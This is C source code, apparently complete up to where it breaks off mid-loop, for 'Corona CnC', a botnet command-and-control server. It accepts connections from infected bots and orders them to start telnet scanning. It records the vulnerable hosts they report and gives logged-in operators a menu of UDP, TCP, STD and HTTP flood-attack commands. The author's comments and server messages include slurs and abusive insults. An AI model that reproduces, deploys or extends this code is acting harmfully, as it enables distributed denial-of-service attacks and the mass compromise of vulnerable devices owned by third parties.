/*
                                Corona CnC By vSparkzyy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ How To Use: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Edit cnc port in the CnC settings  
users.sql is where you add users

If you would like to add users in the screen, compile like the following 
gcc cnc.c -o cnc -pthread -DUser
if not just compile and screen it the normal way  

*** Yes i got the add users in the screen from Jonah *** ~ but hey atleast i give credit.

I would much rather you NOT Modify this, how ever skids being skids still will
so if you do, atleast give fucking credit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

//////////////CnC SETTINGS///////////

#define MAXFDS 1000000
#define PORT 12

char *ss_name = "Corona"; 
char *ss_copyright = "vSparkzyy"; 
char *ss_ver = "1.0"; 

////////////////////////////////////
struct account {
    char id[200]; 
    char password[200];
};
static struct account accounts[15]; //max users 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Fuck Boy Change The Port You idiot\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);;
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31mCorona@Botnet]: \x1b[0m", 30, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO|!* GTFOFAG
									            if(send(infd, "!* GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											    if(send(infd, "!* GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* FATCOCK\n", 11, MSG_NOSIGNAL);
										
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("report.sql", "a");
        fprintf(logFile, "\nIncoming Connnection From :%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; Loaded: %d | Users Online: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users.sql", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("users.sql", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }
        
		char login1 [5000];
        char login2 [5000];
        char login3 [5000];
        char login4 [5000];
        char login5 [5000];
        char login6 [5000];
		char login7 [5000];
		char login8 [5000];
		char login9 [5000];


        sprintf(login2,  "\e[0;36m\e[0;36m\e[0m[\e[0;32m+\e[0m] Welcome To %s Version %s By %s\e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n", ss_name, ss_ver, ss_copyright);
        sprintf(login3,  "\e[0;36m\e[0;36m\e[0m[\e[0;32m+\e[0m] Please Respect Others And Bot Count \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n");
        sprintf(login4,  "\e[0;36m\e[0;36m\e[0m[\e[0;32m+\e[0m] NO Spamming Attacks \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\ \r\n");
        sprintf(login5,  "\e[0;36m\e[0;36m\e[0m[\e[0;32m+\e[0m] Dont Share Logins \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n");
		sprintf(login8,  "\e[0;36m\e[0;36m\e[0m[\e[0;32m+\e[0m] Enter Credentials To Join The BotNet \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n");
		
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, login2, strlen(login2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, login3, strlen(login3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, login4, strlen(login4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, login5, strlen(login5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, login8, strlen(login8), MSG_NOSIGNAL) == -1) goto end;

		
		
        if(send(thefd, "\e[1;34mUsername\e[1;33m: \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
        if(send(thefd, "\e[1;34mPassword\e[1;33m: ", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;

        trim(buf);
		
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[34mError, Incorrect Login Credentials\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		FILE *logFile;
        logFile = fopen("logins.sql", "a");
		fprintf(logFile, "[Failed Login Attempt] \n");
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
		sleep(5);
        goto end;
        fak:
		
		pthread_create(&title, NULL, &titleWriter, sock);
		char line1  [5000];
		char line2  [5000];
		char line3  [5000];
		char line4  [5000];
		char line5  [5000];
		char line6  [5000];
		char line7  [5000];
		char line8  [5000];
		char line9  [5000];
		char line10 [5000];
		char line11 [5000];
                                                                
        sprintf(line1, "\e[0;36mWelcome \e[0;31m%s\e[0;36m To The Corona CnC. Version: [\e[0;31m%s\e[0;36m] \r\n", accounts[find_line].id, ss_ver, buf);
		sprintf(line2, "\e[0;31mCorona \e[0;36mWhere Only The Top Botnetoligists Come To Control Their Slaves. \r\n", accounts[find_line].id, ss_ver, buf);
		sprintf(line3,"\e[0;31m[\e[0;36mCorona\e[0;31m@\e[0;36mBotnet\e[0;31m\e[0;31m]: \e[0m");
		
		if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4,  strlen(line4),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5,  strlen(line5),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6,  strlen(line6),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7,  strlen(line7),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line8,  strlen(line8),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9,  strlen(line9),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line10, strlen(line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line11, strlen(line11), MSG_NOSIGNAL) == -1) goto end;		
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if(strstr(buf, "help") || strstr(buf, "HELP"))
        {
		  sprintf(botnet, "\e[1;33mcmds - Shows available attack methods\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "banners - Shows available banners\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "bots - Shows bot count\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "cls - Clears screen\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "info - Shows cnc info\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  
		
        if(strstr(buf, "bots")) 
	    {  
		  sprintf(botnet, "\e[1;33mUsers: [%d]\r\nBots: [%d]\r\n\x1b[37m", managesConnected, clientsConnected());
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
	    if(strstr(buf, "banners"))
		{  
		  sprintf(botnet, "\e[1;33msenpai - Senpai Banner\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "banksy - Banksy Banner\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "error - Error Banner\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }	    
	    if(strstr(buf, "info"))
		{  
		sprintf(botnet, "\e[1;33m%s version: [%s] by %s \r\n", ss_name, ss_ver, ss_copyright);
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* SCANNER OFF"))
		{  
		sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "STD") || strstr(buf, "UDP") || strstr(buf, "TCP") || strstr(buf, "HTTP") || strstr(buf, "RAWUDP") || strstr(buf, "UNKNOWN"))
		{  
		sprintf(botnet, "Succesfully Sent Attack!\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "cmds")) 
	    {  
		  sprintf(botnet, "\e[1;33mUDP: !* UDP IP PORT TIME 32 0 10\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "TCP: !* TCP IP PORT TIME 32 METHOD 0 10\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "STD: !* STD IP PORT TIME \r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "HTTP: !* HTTP METHOD TARGET PORT PATH TIME 150\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		
		if(strstr(buf, "senpai")) {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        

        char senpai1 [5000];
        char senpai2 [5000];
        char senpai3 [5000];
        char senpai4 [5000];
        char senpai5 [5000];
        char senpai6 [5000];
		char senpai7 [5000];
		char senpai8 [5000];
		char senpai9 [5000];


        sprintf(senpai2,  "\x1b[1;35m 		 ███████\x1b[1;36m╗\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m███\x1b[1;36m╗   \x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██████\x1b[1;36m╗  \x1b[1;35m█████\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m╗\r\n");
        sprintf(senpai3,  "\x1b[1;35m  		 ██\x1b[1;36m╔════╝\x1b[1;35m██\x1b[1;36m╔════╝\x1b[1;35m████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai4,  "\x1b[1;35m 		 ███████\x1b[1;36m╗\x1b[1;35m█████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m╔\x1b[1;35m██\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██████\x1b[1;36m╔╝\x1b[1;35m███████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai5,  "\x1b[1;36m  		 ╚════\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══╝  \x1b[1;35m██\x1b[1;36m║╚\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔═══╝ \x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai6,  "\x1b[1;35m  	  	 ███████\x1b[1;36m║\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║ ╚\x1b[1;35m████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║     \x1b[1;35m██\x1b[1;36m║  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai7,  "\x1b[1;36m  		 ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n");
		sprintf(senpai8,  "\e[0;36m                        \e[0;36m\e[0m[\e[0;32m+\e[0m] Type help for Commands \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n");
		sprintf(senpai9, "\e[0;31m[\e[0;36mCorona\e[0;31m@\e[0;36mBotnet\e[0;31m\e[0;31m]: \e[0m", usernamez);
		
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai2, strlen(senpai2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai3, strlen(senpai3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai4, strlen(senpai4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai5, strlen(senpai5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai6, strlen(senpai6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, senpai7, strlen(senpai7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, senpai8, strlen(senpai8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, senpai9, strlen(senpai8), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        break;
        }
        continue;
        
        }
		
		if(strstr(buf, "error")) {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        

        char error1 [5000];
        char error2 [5000];
        char error3 [5000];
        char error4 [5000];
        char error5 [5000];
        char error6 [5000];
		char error7 [5000];
		char error8 [5000];
		char error9 [5000];


        sprintf(error2,  "\e[0;35m		███████\e[1;34m╗\e[0;35m██████\e[1;34m╗\e[0;35m ██████\e[1;34m╗\e[0;35m  ██████\e[1;34m╗\e[0;35m ██████\e[1;34m╗ \r\n");
        sprintf(error3,  "\e[0;35m		██\e[1;34m╔════╝\e[0;35m██\e[1;34m╔══\e[0;35m██\e[1;34m╗\e[0;35m██\e[1;34m╔══\e[0;35m██\e[1;34m╗\e[0;35m██\e[1;34m╔═══\e[0;35m██\e[1;34m╗\e[0;35m██\e[1;34m╔══\e[0;35m██\e[1;34m╗\r\n");
        sprintf(error4,  "\e[0;35m		█████\e[1;34m╗\e[0;35m  ██████\e[1;34m╔╝\e[0;35m██████\e[1;34m╔╝\e[0;35m██\e[1;34m║  \e[0;35m ██\e[1;34m║\e[0;35m██████\e[1;34m╔╝\r\n");
        sprintf(error5,  "\e[0;35m		██\e[1;34m╔══╝ \e[0;35m ██\e[1;34m╔══\e[0;35m██\e[1;34m╗\e[0;35m██\e[1;34m╔══\e[0;35m██\e[1;34m╗\e[0;35m██\e[1;34m║   \e[0;35m██\e[1;34m║\e[0;35m██\e[1;34m╔══\e[0;35m██\e[1;34m╗\r\n");
        sprintf(error6,  "\e[0;35m		███████\e[1;34m╗\e[0;35m██\e[1;34m║  \e[0;35m██\e[1;34m║\e[0;35m██\e[1;34m║ \e[0;35m ██\e[1;34m║╚\e[0;35m██████\e[1;34m╔╝\e[0;35m██\e[1;34m║ \e[0;35m ██\e[1;34m║\r\n");
        sprintf(error7,  "\e[1;34m		╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝\r\n");
		sprintf(error8,  "\e[0;36m\e[0m                  [\e[0;32m+\e[0m] Type help for Commands \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n");
		sprintf(error9,  "\e[0;31m[\e[0;36mCorona\e[0;31m@\e[0;36mBotnet\e[0;31m\e[0;31m]: \e[0m", usernamez);
		
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, error2, strlen(error2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, error3, strlen(error3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, error4, strlen(error4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, error5, strlen(error5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, error6, strlen(error6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, error7, strlen(error7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, error8, strlen(error8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, error9, strlen(error9), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        break;
        }
        continue;
        
        }
		
		if(strstr(buf, "banksy")) {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        
        char banksy1 [5000];
        char banksy2 [5000];
        char banksy3 [5000];
        char banksy4 [5000];
        char banksy5 [5000];
        char banksy6 [5000];
		char banksy7 [5000];
		char banksy8 [5000];


        sprintf(banksy1,     "\e[1;34m██████\x1b[1;36m╗ \e[1;34m █████\x1b[1;36m╗\e[1;34m ███\x1b[1;36m╗  \e[1;34m ██\x1b[1;36m╗\e[1;34m██\x1b[1;36m╗ \e[1;34m ██\x1b[1;36m╗\e[1;34m███████\x1b[1;36m╗\e[1;34m██\x1b[1;36m╗ \e[1;34m  ██\x1b[1;36m╗\r\n");
		sprintf(banksy2,     "\e[1;34m██\x1b[1;36m╔══\e[1;34m██\x1b[1;36m╗\e[1;34m██\x1b[1;36m╔══\e[1;34m██\x1b[1;36m╗\e[1;34m████\x1b[1;36m╗  \e[1;34m██\x1b[1;36m║\e[1;34m██\x1b[1;36m║ \e[1;34m██\x1b[1;36m╔╝\e[1;34m██\x1b[1;36m╔════╝╚\e[1;34m██\x1b[1;36m╗\e[1;34m ██\x1b[1;36m╔╝\r\n");
		sprintf(banksy3,     "\e[1;34m██████\x1b[1;36m╔╝\e[1;34m███████\x1b[1;36m║\e[1;34m██\x1b[1;36m╔\e[1;34m██\x1b[1;36m╗\e[1;34m ██\x1b[1;36m║\e[1;34m█████\x1b[1;36m╔╝\e[1;34m ███████\x1b[1;36m╗ ╚\e[1;34m████\x1b[1;36m╔╝ \r\n");
		sprintf(banksy4,     "\e[1;34m██\x1b[1;36m╔══\e[1;34m██\x1b[1;36m╗\e[1;34m██\x1b[1;36m╔══\e[1;34m██\x1b[1;36m║\e[1;34m██\x1b[1;36m║╚\e[1;34m██\x1b[1;36m╗\e[1;34m██\x1b[1;36m║\e[1;34m██\x1b[1;36m╔═\e[1;34m██\x1b[1;36m╗ ╚════\e[1;34m██\x1b[1;36m║  ╚\e[1;34m██\x1b[1;36m╔╝  \r\n");
		sprintf(banksy5,     "\e[1;34m██████\x1b[1;36m╔╝\e[1;34m██\x1b[1;36m║  \e[1;34m██\x1b[1;36m║\e[1;34m██\x1b[1;36m║ ╚\e[1;34m████\x1b[1;36m║\e[1;34m██\x1b[1;36m║ \e[1;34m ██\x1b[1;36m╗\e[1;34m███████\x1b[1;36m║  \e[1;34m ██\x1b[1;36m║   \r\n");
		sprintf(banksy6,     "\x1b[1;36m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝   ╚═╝ \r\n");
		sprintf(banksy7,     "\e[0;36m\e[0m[\e[0;32m+\e[0m] Type help for Commands \e[0;36m\e[0m[\e[0;32m+\e[0m]\x1b[37m\r\n");
		sprintf(banksy8, "\e[0;31m[\e[0;36mCorona\e[0;31m@\e[0;36mBotnet\e[0;31m\e[0;31m]: \e[0m", usernamez);
		
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banksy1, strlen(banksy1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, banksy2, strlen(banksy2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, banksy3, strlen(banksy3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, banksy4, strlen(banksy4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, banksy5, strlen(banksy5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, banksy6, strlen(banksy6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banksy7, strlen(banksy7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banksy8, strlen(banksy8), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        break;
        }
        continue;
        
        }
		
